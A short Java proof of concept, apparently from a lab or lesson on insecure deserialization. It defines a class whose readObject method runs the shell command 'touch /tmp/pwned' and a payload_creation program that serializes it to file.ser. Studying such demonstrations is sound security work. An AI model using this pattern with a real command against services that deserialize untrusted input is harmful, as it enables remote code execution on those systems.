import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;

class A implements Serializable {
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException{
        in.defaultReadObject();
        try {
            String[] cmd = {"sh","-c","touch /tmp/pwned"};
            Process process = Runtime.getRuntime().exec(cmd);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

public class payload_creation{
    public static void main(String[] args) {
        A object = new A();
        String filename = "file.ser";

        try {
            FileOutputStream file = new FileOutputStream(filename);
            ObjectOutputStream out = new ObjectOutputStream(file);
            out.writeObject(object);
            out.close();
            file.close();
        } catch (IOException e) {
            System.err.println("IOException");
        }

    }
}